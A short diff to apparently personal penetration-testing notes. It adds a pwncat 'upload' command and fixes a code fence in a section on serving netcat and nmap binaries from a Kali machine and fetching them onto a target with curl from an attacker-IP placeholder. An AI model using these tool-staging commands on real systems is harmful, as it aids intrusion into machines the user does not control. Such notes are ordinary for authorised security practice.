@@ -64,12 +64,14 @@ pwncat-vl
 ```bash
 help
 back # remote terminal
+upload [source file] [destination]
 ```
 
 Binary (netcat, nmap...) sharing between Kali - Target with curl 
-````bash
+```bash
 python -m http.server <port>
 which <binary>
 cp <path> <repertory> # where python server running
 cd /var/www/html # on target, binary to be wrote within
 curl -O http://<attacker-ip>:<python-server-port>/<binary>
+```
